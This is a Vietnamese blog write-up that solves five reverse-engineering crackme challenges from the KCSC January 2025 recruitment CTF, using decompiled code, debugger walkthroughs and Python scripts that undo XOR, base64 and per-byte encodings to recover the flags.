---
title: KCSC Recruitment 2025
date: 2025-01-27
categories: [Write up]
tags: [CTFs, Reverse]
image: /assets/posts/KCSC_Recruitment_01_2025/kcsc_recruitment_01-2025.jpg
math: true
description: Write up KCSC-Recruitment tháng 1 2025
---

## 1. Hidden

![ảnh](https://hackmd.io/_uploads/rJobh0tvJe.png)

Chạy thử chal thì `fake_flag` hiện ra.

![ảnh](https://hackmd.io/_uploads/HJFjqRKPJx.png)

Load file vào IDA.

![ảnh](https://hackmd.io/_uploads/By_U319vye.png)

Trace thử hàm `printf_0` thì thấy nó được gọi từ hàm `printFlag`.

Tên chal là *`hidden`* tức là ẩn giấu nên có thể hàm đó chứa flag cần tìm.

![ảnh](https://hackmd.io/_uploads/H19A2kqDye.png)

Hàm này thực hiện duyệt từng byte trong mảng `_QWORD v2` đem xor với `0x88` và gọi hàm `printf_0` in ra định dạng là ký tự `%c`.

```python
enc = [
    0xFDE7F1F3CBDBCBC3,
    0xFBD7FCAFE6E9EBD7,
    0xF5FEB2EDE5D7EDED,
]

enc_bytes = []
for val in enc:
    enc_bytes.extend(val.to_bytes(8, 'little'))
    dec_chars = [chr(c ^ 0x88) for c in enc_bytes]
    # print(dec_chars)

dec_str = ''.join(dec_chars)
print(dec_str)
```
> `KCSC{you_can't_see_me:v}`

![ảnh](https://hackmd.io/_uploads/rk-cexqw1x.png)


## 2. easyre

![ảnh](https://hackmd.io/_uploads/SymdwgcPke.png)

Chall yêu cầu nhập flag và thực hiện kiểm tra.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rax
  size_t v4; // rax
  __int64 v5; // rdx
  __int64 v6; // rcx
  __int64 v7; // r8
  __int64 v8; // r9
  __int64 length; // rax
  unsigned int v10; // edx
  unsigned int v11; // r8d
  unsigned __int64 v12; // rax
  __m128 v13; // xmm0
  __m128 v14; // xmm1
  __int64 v15; // rcx
  __int64 v16; // rax
  char *v17; // rcx
  char Buffer[16]; // [rsp+20h] [rbp-68h] BYREF
  __int128 v20; // [rsp+30h] [rbp-58h] BYREF
  int v21; // [rsp+40h] [rbp-48h]
  _OWORD enc_input[2]; // [rsp+48h] [rbp-40h] BYREF
  __int64 v23; // [rsp+68h] [rbp-20h]
  int v24; // [rsp+70h] [rbp-18h]
  char v25; // [rsp+74h] [rbp-14h]

  LOBYTE(v21) = 0;
  v23 = 0LL;
  *(_OWORD *)Buffer = 0LL;
  v24 = 0;
  v20 = 0LL;
  v25 = 0;
  memset(enc_input, 0, sizeof(enc_input));
  sub_140001010("Enter flag: ");
  v3 = _acrt_iob_func(0);
  fgets(Buffer, 33, v3);
  v4 = strcspn(Buffer, "\n");
  if ( v4 >= 0x21 )
    sub_140001558(
      v6,
      v5,
      v7,
      v8,
      *(_QWORD *)Buffer,
      *(_QWORD *)&Buffer[8],
      v20,
      *((_QWORD *)&v20 + 1),
      v21,
      *(_QWORD *)&enc_input[0],
      *((_QWORD *)&enc_input[0] + 1));
  Buffer[v4] = 0;
  length = -1LL;
  do
    ++length;
  while ( Buffer[length] );
  if ( length == 32 )
  {
    sub_140001070(Buffer, enc_input);
    v10 = 0;
    v11 = 0;
    v12 = 0LL;
    do
    {
      v13 = (__m128)_mm_loadu_si128((const __m128i *)&xor_bytes[v12]);
      v11 += 32;
      v14 = (__m128)_mm_loadu_si128((const __m128i *)&enc_input[v12 / 0x10]);
      v12 += 32LL;
      *(__m128 *)&dword_140005058[v12 / 4] = _mm_xor_ps(v14, v13);
      *(__m128 *)&qword_140005068[v12 / 8] = _mm_xor_ps(
                                               (__m128)_mm_loadu_si128((const __m128i *)((char *)&v20 + v12 + 8)),
                                               (__m128)_mm_loadu_si128((const __m128i *)&qword_140005068[v12 / 8]));
    }
    while ( v11 < 0x20 );
    v15 = (int)v11;
    if ( (unsigned __int64)(int)v11 < 0x2C )
    {
      do
      {
        ++v11;
        xor_bytes[v15] ^= *((_BYTE *)enc_input + v15);
        ++v15;
      }
      while ( v11 < 0x2C );
    }
    v16 = 0LL;
    while ( enc_flag[v16] == xor_bytes[v16] )
    {
      ++v10;
      ++v16;
      if ( v10 >= 0x2C )
      {
        v17 = "Correct!\n";
        goto LABEL_13;
      }
    }
  }
  v17 = "Incorrect!\n";
LABEL_13:
  sub_140001010(v17);
  return 0;
}
```

Load vào IDA

Phân tích qua thì chương trình yêu cầu nhập $flag$ với độ dài 32 ký tự và biến đổi qua hàm `sub_140001070` rồi lưu vào **enc_input**.

Sau đó mảng `xor_bytes` đem $xor$ với **enc_input**.

Cuối cùng so sánh với mảng `enc_flag`.

```c
__int64 __fastcall sub_140001070(__int64 buf, _BYTE *enc_input)
{
  int v4; // r9d
  __int64 result; // rax
  __int64 v6; // r10
  __int64 v7; // r8
  _DWORD *v8; // rdx
  int v9; // ecx
  __int64 v10; // rbx
  _BYTE *v11; // rdi
  int v12; // r8d
  int v13; // r10d
  int v14; // edx
  int v15; // edx
  _DWORD *v16; // r11
  int v17; // ecx
  int v18; // ecx
  int v19; // ecx
  int v20; // ecx
  _BYTE *v21; // rcx
  _DWORD v22[1024]; // [rsp+20h] [rbp-1028h] BYREF

  memset(v22, 0, sizeof(v22));
  v4 = 0;
  result = -1LL;
  do
    ++result;
  while ( *(_BYTE *)(buf + result) );
  v6 = (int)result;
  if ( (int)result > 0 )
  {
    v7 = 0LL;
    v8 = &v22[1];
    v4 = 8 * result;
    do
    {
      v9 = *(char *)(buf + v7);
      v8 += 8;
      ++v7;
      *(v8 - 9) = (v9 >> 7) & 1;
      *(v8 - 8) = (v9 >> 6) & 1;
      *(v8 - 7) = (v9 >> 5) & 1;
      *(v8 - 6) = (v9 >> 4) & 1;
      *(v8 - 5) = (v9 >> 3) & 1;
      *(v8 - 4) = (v9 >> 2) & 1;
      result = (v9 >> 1) & 1;
      *(v8 - 2) = v9 & 1;
      *(v8 - 3) = result;
    }
    while ( v7 < v6 );
  }
  if ( v4 > 0 )
  {
    v10 = 0LL;
    v11 = enc_input;
    v12 = 2;
    v13 = (v4 - 1LL) / 6uLL + 1;
    do
    {
      if ( v12 - 2 >= v4 )
        v14 = 0;
      else
        v14 = v22[v10];
      v15 = 2 * v14;
      if ( v12 - 1 < v4 )
        v15 |= v22[v10 + 1];
      v16 = &v22[v10];
      v17 = 2 * v15;
      if ( v12 < v4 )
        v17 |= v16[2];
      v18 = 2 * v17;
      if ( v12 + 1 < v4 )
        v18 |= v16[3];
      v19 = 2 * v18;
      if ( v12 + 2 < v4 )
        v19 |= v16[4];
      v20 = 2 * v19;
      if ( v12 + 3 < v4 )
        v20 |= v16[5];
      v12 += 6;
      v10 += 6LL;
      *v11++ = aAbcdefghijklmn[v20];
    }
    while ( v10 < v4 );
    result = v13 & 0x80000003;
    if ( v13 < 0 )
      result = ((unsigned __int8)((v13 & 3) - 1) | 0xFFFFFFFC) + 1;
    if ( (_DWORD)result )
    {
      v21 = &enc_input[v13];
      do
      {
        ++v13;
        *v21++ = 61;
        result = v13 & 0x80000003;
        if ( v13 < 0 )
          result = ((unsigned __int8)((v13 & 3) - 1) | 0xFFFFFFFC) + 1;
      }
      while ( (_DWORD)result );
    }
  }
  return result;
}
```

Vào hàm `sub_140001070` kiểm tra có vẻ khá phức tạp.
```c
if (v4 > 0)
{
  v10 = 0LL;
  v11 = a2;
  v12 = 2;
  v13 = (v4 - 1LL) / 6uLL + 1;
  do
  {
    ...
    *v11++ = aAbcdefghijklmn[v20];
  }
  while (v10 < v4);
  ...
}
return result;
```
![ảnh](https://hackmd.io/_uploads/S1laYB5vJe.png)

Ở đây input được chuyển đổi từng byte thành bit và xử lý từng nhóm 6 bit một, chuyển đổi thành các ký tự trong bảng `Base64` (`aAbcdefghijklmn`). 
Cuối cùng ký tự `=` được thêm vào cuối để làm đầy đủ 4 ký tự của chuỗi `Base64`.

**Debug** thử để xác nhận.

![ảnh](https://hackmd.io/_uploads/HyNZEB9wJl.png)
![ảnh](https://hackmd.io/_uploads/ryuIVBcvkl.png)
![ảnh](https://hackmd.io/_uploads/HJ5lHHqwyg.png)

**Buffer** hiện tại đang chứa 32 ký tự `a` 

![ảnh](https://hackmd.io/_uploads/H1owBBqw1e.png)

**enc_input** (addr: 0x08690B0FA48) chưa có gì.

![ảnh](https://hackmd.io/_uploads/ByV1IB5w1l.png)

**F8** và kiểm tra lại **enc_input** thì nhận được chuỗi như trên.

![ảnh](https://hackmd.io/_uploads/S11KIr5wkg.png)

`Shift + E` **enc_input** và lên cyberchef giải mã.
![ảnh](https://hackmd.io/_uploads/SkRTUrcvyx.png)

Đúng là như vậy. 

![ảnh](https://hackmd.io/_uploads/BkD5CBqw1x.png)
![ảnh](https://hackmd.io/_uploads/Hy5ZAB5w1l.png)

Tiếp tục debug, mảng `xor_bytes` chưa đem $xor$ với **enc_input**.

![ảnh](https://hackmd.io/_uploads/B1onAH5w1x.png)
![ảnh](https://hackmd.io/_uploads/HkBAAB5PJe.png)

**F8** qua dòng 67 thì mảng `xor_bytes` đã bị $xor$.

![ảnh](https://hackmd.io/_uploads/BJLryUcDJe.png)
![ảnh](https://hackmd.io/_uploads/BJfPyIqD1x.png)

Tới đây so sánh với từng giá trị trong mảng `enc_flag`.

Tóm lại **flag** nhập vào sẽ bị mã hoá `Base64` và lưu vào **enc_input**. Sau đó mảng `xor_bytes` sẽ $xor$ với **enc_input** và so sánh với `enc_flag`.

Vì thế để tìm $flag$ đúng sẽ phải **xor** `enc_flag` với `xor_bytes` ban đầu, sau đó giải mã `Base64`.

```python
import base64

xor_bytes = bytes([
        0x92, 0xA1, 0x27, 0xE0, 0x37, 0xCA, 0x70, 0x7E, 0xE6, 0xBE,
        0x33, 0x1D, 0x5D, 0xFE, 0x29, 0x93, 0xB6, 0x66, 0xF9, 0x02,
        0x6A, 0x74, 0x0D, 0xDF, 0xD6, 0xEC, 0x5A, 0x71, 0xC8, 0xA3,
        0xFD, 0x84, 0xC5, 0x13, 0x1E, 0x87, 0xC7, 0x52, 0x50, 0x55,
        0x01, 0x16, 0xFD, 0xCF
])

enc_flag = bytes([
        0xC1, 0x91, 0x69, 0xB4, 0x66, 0xF9, 0x04, 0x12, 0xB2, 0xD3,
        0x7D, 0x6B, 0x0F, 0xB9, 0x7F, 0xF5, 0xD2, 0x1C, 0xBF, 0x32,
        0x0B, 0x32, 0x34, 0x9C, 0x98, 0xA4, 0x14, 0x37, 0x86, 0xC9,
        0xAF, 0xE2, 0x9C, 0x46, 0x2B, 0xEC, 0x9F, 0x63, 0x38, 0x23,
        0x54, 0x78, 0xCD, 0xF2
])

dec = bytes([enc_flag[i] ^ xor_bytes[i] for i in range(len(enc_flag))])

flag = base64.b64decode(dec)

print(flag.decode())
```

> `KCSC{eNcoDe_w1th_B4sE64_aNd_XoR}`

![ảnh](https://hackmd.io/_uploads/rJL5WL5Pkl.png)


## 3. Spy Room

![ảnh](https://hackmd.io/_uploads/Sk-BytqPyl.png)
![ảnh](https://hackmd.io/_uploads/SkBtfHsPJl.png)

Một chal viết bằng `C#` dạng `flagchecker`.

```c#
// TestEzDotNET.Program
// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
private static void Main()
{
	Console.Write("Enter Something: ");
	char[] array = Console.ReadLine().ToCharArray();
	int num = array.Length;
	char[] array2 = array.Take(num / 4).ToArray<char>();
	char[] array3 = array.Skip(num / 4).Take(num / 4).ToArray<char>();
	char[] array4 = array.Skip(2 * num / 4).Take(num / 4).ToArray<char>();
	char[] array5 = array.Skip(3 * num / 4).ToArray<char>();
	array2 = Program.Xor(array2, array3);
	array3 = Program.Xor(array3, array4);
	array4 = Program.Xor(array4, array5);
	array5 = Program.Xor(array5, array2);
	char[] array6 = array2.Concat(array3).Concat(array4).Concat(array5).ToArray<char>();
	string text = "https://www.youtube.com/watch?v=L8XbI9aJOXk";
	array6 = Program.Xor(array6, text.ToCharArray());
	byte[] source = new byte[]
	{
		85,
		122,
		105,
		71,
		17,
		94,
		71,
		24,
		114,
		78,
		107,
		11,
		108,
		106,
		107,
		113,
		121,
		51,
		91,
		117,
		86,
		110,
		100,
		18,
		124,
		104,
		71,
		66,
		123,
		3,
		111,
		99,
		74,
		107,
		69,
		77,
		111,
		2,
		120,
		125,
		83,
		99,
		62,
		99,
		109,
		76,
		119,
		111,
		59,
		32,
		1,
		93,
		69,
		117,
		84,
		106,
		73,
		85,
		112,
		66,
		114,
		92,
		61,
		80,
		80,
		104,
		111,
		72,
		98,
		28,
		88,
		94,
		27,
		120,
		15,
		76,
		15,
		67,
		86,
		117,
		81,
		108,
		18,
		37,
		34,
		101,
		104,
		109,
		23,
		30,
		62,
		78,
		88,
		10,
		2,
		63,
		43,
		72,
		102,
		38,
		76,
		23,
		34,
		62,
		21,
		97,
		1,
		97
	};
	if (!array6.SequenceEqual((from e in source
	select (char)e).ToArray<char>()))
	{
		Console.WriteLine("Wrong!!");
		return;
	}
	Console.WriteLine("Decode It!!");
}

```
Mở bằng `dnSpy`.

![ảnh](https://hackmd.io/_uploads/HJqIPwow1e.png)

Phân tích qua thì chương trình chuyển **input** thành mảng ký tự và chia thành 4 mảng = nhau (`array 2, 3, 4, 5`).

Tiếp theo **xor** giữa các mảng và sử dụng phương thức [Concat](https://learn.microsoft.com/vi-vn/dotnet/api/system.string.concat?view=net-5.0) để nối các array với nhau tạo thành `array6`.

Sau đó đem **xor** `array6` với chuỗi `text`.

![ảnh](https://hackmd.io/_uploads/SJokjBovyl.png)

Cuối cùng kiểm tra kết quả đã **xor** với 108 giá trị trong `source`.

![ảnh](https://hackmd.io/_uploads/HkJSjrowkx.png)

Đây là phương thức `Xor` của chương trình.

Khái quát thì nó nhận vào 2 array a và b:
* Tạo mảng mới có độ dài bằng độ dài lớn nhất của a và b
* Thực hiện phép XOR từng cặp ký tự:
    * Nếu a dài hơn b: lấy ký tự của a XOR với ký tự lặp lại của b.
    * Nếu b dài hơn a: lấy ký tự lặp lại của a XOR với ký tự của b.

Tóm lại flow của chal đơn giản là nhận **input** có độ dài là 108 --> chia thành 4 phần = nhau --> **xor** từng phần --> nối lại và **xor** với `text` --> so sánh với `source`.

Để tìm được **input** đúng cần **xor** `source` với `text` để có `array6` --> chia thành 4 phần và **xor** theo thứ tự và nối lại thành **input**.

```python
    temp_arr5 = xor(arr5, arr2)
    temp_arr4 = xor(arr4, temp_arr5)
    temp_arr3 = xor(arr3, temp_arr4)
    temp_arr2 = xor(arr2, temp_arr3)
    
    tmp_arr6 = temp_arr2 + temp_arr3 + temp_arr4 + temp_arr5
```


```python
import base64

def xor(a, b):
    max_len = max(len(a), len(b))
    res = []
    
    for i in range(max_len):
        if len(a) >= len(b):
            res.append(chr(ord(a[i]) ^ ord(b[i % len(b)])))
        else:
            res.append(chr(ord(a[i % len(a)]) ^ ord(b[i])))
    return res

def main():
    source = [
        85, 122, 105, 71, 17, 94, 71, 24, 114, 78, 107, 11, 108, 106, 107, 113, 121, 
        51, 91, 117, 86, 110, 100, 18, 124, 104, 71, 66, 123, 3, 111, 99, 74, 107, 69, 
        77, 111, 2, 120, 125, 83, 99, 62, 99, 109, 76, 119, 111, 59, 32, 1, 93, 69, 
        117, 84, 106, 73, 85, 112, 66, 114, 92, 61, 80, 80, 104, 111, 72, 98, 28, 88, 
        94, 27, 120, 15, 76, 15, 67, 86, 117, 81, 108, 18, 37, 34, 101, 104, 109, 23, 
        30, 62, 78, 88, 10, 2, 63, 43, 72, 102, 38, 76, 23, 34, 62, 21, 97, 1, 97
    ]
    # print("Length of source:", len(source))

    text = "https://www.youtube.com/watch?v=L8XbI9aJOXk"
    # print("Length of text:", len(text))

    # XOR với text để lấy arr6
    src_char = [chr(c) for c in source]
    arr6 = xor(src_char, list(text))
    # print("Length of arr6:", len(arr6))

    # Chia thành 4 phần
    i = len(arr6) // 4

    arr2 = arr6[:i]
    arr3 = arr6[i:2*i]
    arr4 = arr6[2*i:3*i]
    arr5 = arr6[3*i:]

    # Rev xor
    temp_arr5 = xor(arr5, arr2)
    temp_arr4 = xor(arr4, temp_arr5)
    temp_arr3 = xor(arr3, temp_arr4)
    temp_arr2 = xor(arr2, temp_arr3)

    tmp_arr6 = temp_arr2 + temp_arr3 + temp_arr4 + temp_arr5

    input_str = bytes(''.join(tmp_arr6), 'utf8')
    print(input_str.decode())

    flag = input_str
    for i in range(3):
        flag = base64.b64decode(flag)
    print(flag.decode())


main()
```

![ảnh](https://hackmd.io/_uploads/B1lEGwivJg.png)

**Input** chính xác rồi và decode base64 3 lần để có **flag**.

> `KCSC{Easy_Encryption_With_DotNET_Program:3}`

![ảnh](https://hackmd.io/_uploads/BJ7GGPivJx.png)


## 4. EzRev

![ảnh](https://hackmd.io/_uploads/S1DuZdiwyg.png)

Chal có dạng là `flagchecker`.

{% raw %}
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+20h] [rbp-28h]
  __int64 v5; // [rsp+28h] [rbp-20h]

  print("Enter Something: ", argv, envp);
  scan("%s", input);
  if ( (unsigned int)sub_140001100(input) == -1982483102 )
  {
    v5 = -1LL;
    do
      ++v5;
    while ( input[v5] );
    if ( v5 == 40 )
    {
      sub_140001000(input);
      res = 1;
      for ( i = 0; i < 40; ++i )
      {
        if ( enc_flag[i] != enc_input[i] )
          res = 0;
      }
    }
  }
  if ( res )
    print("Excellent!! Here is your flag: KCSC{%s}", input);
  else
    print("You're chicken!!!");
  return 0;
}
```
{% endraw %}

Load vào IDA.

Chương trình yêu cầu **input** và thực hiện kiểm tra và biến đổi qua 2 hàm `sub_140001100` và `sub_140001000` sau đó so sánh với `enc_flag`.

```c
__int64 __fastcall sub_140001100(__int64 input)
{
  unsigned int v2; // [rsp+0h] [rbp-28h]
  unsigned int i; // [rsp+4h] [rbp-24h]
  __int64 v4; // [rsp+10h] [rbp-18h]

  v2 = 0x811C9DC5;
  v4 = -1LL;
  do
    ++v4;
  while ( *(_BYTE *)(input + v4) );
  for ( i = 0; i < (unsigned int)v4; ++i )
    v2 = 16777619 * (*(char *)(input + (int)i) ^ v2);
  return v2;
}
```

Kiểm tra hàm `sub_140001100` thấy nó khởi tạo `v2 = 0x811C9DC5` --> tính độ dài **input** --> thực hiện tính toán `v2` trong vòng lặp khá lạ.

![ảnh](https://hackmd.io/_uploads/HyzGH_iv1x.png)
![ảnh](https://hackmd.io/_uploads/rytKL_iwye.png)
![ảnh](https://hackmd.io/_uploads/BkZxUdjwJl.png)

Google thử thì `0x811C9DC5` là **FNV offset basis** và `16777619` là **FNV prime** (2 tham số) của thuật toán FNV-Hash mà cụ thể ở đây là **FNV-1a** ([Chi tiết ở đây](https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function))

Khái quát qua thì nó khởi tạo giá trị băm với hằng số `offset basis` sau đó xử lý từng byte của data (nhân gía trị băm hiện tại với `FNV prime` sau đó **xor** với byte hiện tại).

```c
__int64 __fastcall enc(__int64 input)
{
  __int64 result; // rax
  unsigned int v2; // [rsp+0h] [rbp-38h]
  unsigned int i; // [rsp+4h] [rbp-34h]
  int j; // [rsp+8h] [rbp-30h]
  int v5; // [rsp+Ch] [rbp-2Ch]
  int v6; // [rsp+10h] [rbp-28h]
  __int64 v7; // [rsp+18h] [rbp-20h]

  v7 = -1LL;
  do
    ++v7;
  while ( *(_BYTE *)(input + v7) );
  for ( i = 0; ; ++i )
  {
    result = (unsigned int)v7;
    if ( i >= (unsigned int)v7 )
      break;
    v5 = 4;
    v6 = 6;
    v2 = *(unsigned __int8 *)(input + (int)i);
    for ( j = 0; j < 5; ++j )
    {
      v2 ^= __ROL4__(v2, v5) ^ __ROR4__(v2, v6);
      v5 *= 2;
      v6 *= 2;
    }
    enc_input[i] = v2;
  }
  return result;
}
```

Hàm `sub_140001000`_`enc` thực hiện mã hoá **input** (40 ký tự) với mỗi ký tự thực hiện 5 vòng lặp, trong mỗi vòng: quay trái, phải --> $xor$ --> tăng gấp đôi v5, v6 --> gán kết quả $xor$ cho `enc_input`.

Cuối cùng so sánh `enc_input` với `enc_flag`.

Tóm lại, để tìm được **input** đúng sẽ `brute-force` 0 - 255 byte vì hàm `enc` mã hoá độc lập từng byte một trong input nên bf thoải mái --> mô phỏng lại quá trình mã hoá --> hash `FNV-1a`.

![ảnh](https://hackmd.io/_uploads/BkBmiOjDyl.png)

`Shift + E` lấy `enc_flag`.

```python
def ror4(val, n):
    n = n % 32
    return ((val >> n) | (val << (32 - n))) & 0xFFFFFFFF

def rol4(val, n):
    n = n % 32
    return ((val << n) | (val >> (32 - n))) & 0xFFFFFFFF

def decrypt_char(encrypted):
    for c in range(256):
        val = c
        v5 = 4
        v6 = 6
        
        # Mô phỏng mã hóa
        for j in range(5):
            val = val ^ (rol4(val, v5) ^ ror4(val, v6))
            v5 *= 2
            v6 *= 2
        
        if val == encrypted:
            return chr(c)
    return None

def fnv1a_hash(input_str):
        hash_val = 0x811C9DC5
        for c in input_str:
            hash_val = ((hash_val ^ ord(c)) * 16777619) & 0xFFFFFFFF
        return hash_val

def main():
    enc_flag = [
        0xF30C0330, 0x340DDE9D, 0x750D9AC9, 0x391FBC2A, 0x9F16AF5B,
        0xE6180661, 0x6C1AAC6B, 0x340DDE9D, 0xB60D5635, 0x9F16AF5B,
        0xA3195364, 0x681BBD3A, 0xF30C0330, 0xA3195364, 0xAB1B71C6,
        0xF30C0330, 0xF21D5274, 0x9F16AF5B, 0xE6180661, 0x300CCFCC,
        0xF21D5274, 0x9F16AF5B, 0xAB1B71C6, 0xA3195364, 0x750D9AC9,
        0xA3195364, 0x9F16AF5B, 0xF21D5274, 0xF30C0330, 0xA3195364,
        0xF21D5274, 0x351C8FD9, 0x710C8B98, 0xF70D1261, 0x2D1AE83F,
        0xF30C0330, 0xEE1A24C3, 0xF70D1261, 0x6108CEDC, 0x6108CEDC
    ]

    # Decode từng byte
    input = ""
    for enc in enc_flag:
        char = decrypt_char(enc)
        input += char

    print(input)

    # Check flag có thỏa điều kiện hash
    if fnv1a_hash(input) == 2312484194:
        print("\npassed!")
    else:
        print("\nfailed!")


main()
```

> `KCSC{345y_fl46_ch3ck3r_f0r_kc5c_r3cru17m3n7!!}`

![ảnh](https://hackmd.io/_uploads/SJ-TlKjPye.png)


## 5. Waiterfall

![image](https://hackmd.io/_uploads/HkbXNKsv1x.png)

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned __int8 idx; // di
  unsigned int pos; // esi
  __int64 v5; // r14
  __int64 v6; // rbp
  __int64 v7; // r15
  __int64 v8; // r12
  __int64 v9; // r13
  char input; // al
  __int64 v11; // rdx
  char *v12; // rcx
  __int64 v14; // rcx
  __int64 v15; // rcx
  __int64 v16; // rcx
  __int64 v17; // rcx
  __int64 v18; // rcx
  __int64 v19; // rcx
  __int64 v20; // rcx
  _BYTE v21[80]; // [rsp+20h] [rbp-88h]

  idx = 0;
  print("Show your skill :))\n");
  pos = 0;
  v5 = 0x1000008020020LL;
  v6 = 0LL;
  v7 = 0x60010020000100LL;
  v8 = 0x100020080408000LL;
  v9 = 0x844000044000LL;
  do
  {
    scan("%c");
    input = v21[v6];
    if ( (unsigned __int8)input <= 0x42u )
    {
LABEL_190:
      Sleep(0x2710u);
      goto LABEL_191;
    }
    switch ( input )
    {
      case 'C':
        idx += ((pos - 1) & 0xFFFFFFFD) == 0;
        break;
      case 'D':
      case 'E':
      case 'F':
      case 'G':
      case 'H':
      case 'I':
      case 'J':
        goto LABEL_190;
      case 'K':
        idx += pos == 0;
        break;
      case 'L':
      case 'M':
      case 'N':
      case 'O':
      case 'P':
      case 'Q':
      case 'R':
        goto LABEL_190;
      case 'S':
        idx += pos == 2;
        break;
      case 'T':
      case 'U':
      case 'V':
      case 'W':
      case 'X':
      case 'Y':
      case 'Z':
      case '[':
      case '\\':
      case ']':
      case '^':
        goto LABEL_190;
      case '_':
        if ( pos <= 0x31 )
        {
          v20 = 0x2101004011000LL;
          if ( _bittest64(&v20, pos) )
            ++idx;
        }
        break;
      case '`':
        goto LABEL_190;
      case 'a':
        if ( pos <= 0x34 )
        {
          v19 = 0x10000210000040LL;
          if ( _bittest64(&v19, pos) )
            ++idx;
        }
        break;
      case 'b':
        goto LABEL_190;
      case 'c':
        idx += pos == 37;
        break;
      case 'd':
        idx += pos == 20;
        break;
      case 'e':
        if ( pos <= 0x37 )
        {
          v18 = 0x80000040200000LL;
          if ( _bittest64(&v18, pos) )
            ++idx;
        }
        break;
      case 'f':
        if ( pos <= 0x32 )
        {
          v17 = 0x4200100802000LL;
          if ( _bittest64(&v17, pos) )
            ++idx;
        }
        break;
      case 'g':
        if ( pos == 11 || pos == 60 )
          ++idx;
        break;
      case 'h':
        goto LABEL_190;
      case 'i':
        if ( pos <= 0x3A )
        {
          v16 = 0x400000000000280LL;
          if ( _bittest64(&v16, pos) )
            ++idx;
        }
        break;
      case 'j':
      case 'k':
        goto LABEL_190;
      case 'l':
        if ( pos <= 0x33 )
        {
          v15 = 0x8480C02000000LL;
          if ( _bittest64(&v15, pos) )
            ++idx;
        }
        break;
      case 'm':
        goto LABEL_190;
      case 'n':
        if ( pos <= 0x3B )
        {
          v14 = 0xA00008000080400LL;
          if ( _bittest64(&v14, pos) )
            ++idx;
        }
        break;
      case 'o':
        if ( pos <= 0x2F && _bittest64(&v9, pos) )
          ++idx;
        break;
      case 'p':
      case 'q':
        goto LABEL_190;
      case 'r':
        if ( pos <= 0x38 && _bittest64(&v8, pos) )
          ++idx;
        break;
      case 's':
        goto LABEL_190;
      case 't':
        if ( pos <= 0x36 && _bittest64(&v7, pos) )
          ++idx;
        break;
      case 'u':
        idx += pos == 24;
        break;
      case 'v':
        goto LABEL_190;
      case 'w':
        if ( pos <= 0x30 && _bittest64(&v5, pos) )
          ++idx;
        break;
      case 'x':
      case 'y':
      case 'z':
        goto LABEL_190;
      case '{':
        idx += pos == 4;
        break;
      case '|':
        goto LABEL_190;
      case '}':
        idx += pos == 61;
        break;
      default:
        if ( input > 125
          || input == (char)0x80
          || input == -127
          || input == -126
          || input == -125
          || input == -124
          || input == -123
          || input == -122
          || input == -121
          || input == -120
          || input == -119
          || input == -118
          || input == -117
          || input == -116
          || input == -115
          || input == -114
          || input == -113
          || input == -112
          || input == -111
          || input == -110
          || input == -109
          || input == -108
          || input == -107
          || input == -106
          || input == -105
          || input == -104
          || input == -103
          || input == -102
          || input == -101
          || input == -100
          || input == -99
          || input == -98
          || input == -97
          || input == -96
          || input == -95
          || input == -94
          || input == -93
          || input == -92
          || input == -91
          || input == -90
          || input == -89
          || input == -88
          || input == -87
          || input == -86
          || input == -85
          || input == -84
          || input == -83
          || input == -82
          || input == -81
          || input == -80
          || input == -79
          || input == -78
          || input == -77
          || input == -76
          || input == -75
          || input == -74
          || input == -73
          || input == -72
          || input == -71
          || input == -70
          || input == -69
          || input == -68
          || input == -67
          || input == -66
          || input == -65
          || input == -64
          || input == -63
          || input == -62
          || input == -61
          || input == -60
          || input == -59
          || input == -58
          || input == -57
          || input == -56
          || input == -55
          || input == -54
          || input == -53
          || input == -52
          || input == -51
          || input == -50
          || input == -49
          || input == -48
          || input == -47
          || input == -46
          || input == -45
          || input == -44
          || input == -43
          || input == -42
          || input == -41
          || input == -40
          || input == -39
          || input == -38
          || input == -37
          || input == -36
          || input == -35
          || input == -34
          || input == -33
          || input == -32
          || input == -31
          || input == -30
          || input == -29
          || input == -28
          || input == -27
          || input == -26
          || input == -25
          || input == -24
          || input == -23
          || input == -22
          || input == -21
          || input == -20
          || input == -19
          || input == -18
          || input == -17
          || input == -16
          || input == -15
          || input == -14
          || input == -13
          || input == -12
          || input == -11
          || input == -10
          || input == -9
          || input == -8
          || input == -7
          || input == -6
          || input == -5
          || input == -4
          || input == -3
          || input == -2 )
        {
          goto LABEL_190;
        }
        break;
    }
LABEL_191:
    ++pos;
    ++v6;
  }
  while ( (int)pos < 62 );
  v11 = -1LL;
  do
    ++v11;
  while ( v21[v11] );
  v12 = "Correct\n";
  if ( idx != v11 )
    v12 = ":((";
  print(v12);
  return 0;
}
```

Tiếp tục là 1 chal `flagchecker`.

Tổng quan thì chương trình kiểm tra $input$ qua rất nhiều `case`. Một biến `idx` đếm số ký tự hợp lệ (tổng cộng có 62 ký tự`(int)v4 < 62`).

Nếu ký tự không hợp lệ (tức không nằm trong case thoả mãn thì nhảy tới `LABEL_190` và `Slepp` 10000 mili giây _ 10 giây). 

Debug thử với 4 ký tự đầu là `KCSC`:
![ảnh](https://hackmd.io/_uploads/B1E8lcsPJg.png)
![ảnh](https://hackmd.io/_uploads/rkIMmqiDJl.png)
![Ảnh](https://hackmd.io/_uploads/Bk3t89sPyg.png)
![ảnh](https://hackmd.io/_uploads/ryM-_5ovJg.png)
![ảnh](https://hackmd.io/_uploads/rkJQdcsPke.png)

**input[0]** hiện tại là `K`. 

Lệnh `test esi, esi` chính là phép so sánh của `pos == 0`, nếu đúng thì trả về 1 và cộng vào idx.

Sau đó nhảy xuống `LABEL_191` tăng pos và tiếp tục kiểm tra toàn bộ ký tự còn lại.

```c
case 'C':
        idx += ((pos - 1) & 0xFFFFFFFD) == 0;
        break;
```

```c
case 'S':
        idx += pos == 2;
        break;
```

Viết lại 3 `case` trên = python:
```python
if (pos - 1) & 0xFFFFFFFD == 0:
    idx += 1
    continue
if pos == 0:
    idx += 1
    continue
if pos == 2:
    idx += 1
    continue
    
pos++
```

Từ phân tích trên có thể minh hoạ cách tìm ký tự hợp lệ như sau:
```python
# Case 'C'
if (pos - 1) & 0xFFFFFFFD == 0:  # pos == 1 hoặc pos == 3
    result[pos] = 'C'
    continue
            
# Case 'K'
if pos == 0:
    result[pos] = 'K'
    continue
            
# Case 'S'
if pos == 2:
    result[pos] = 'S'
    continue
```

Tương tự với các `case` còn lại.

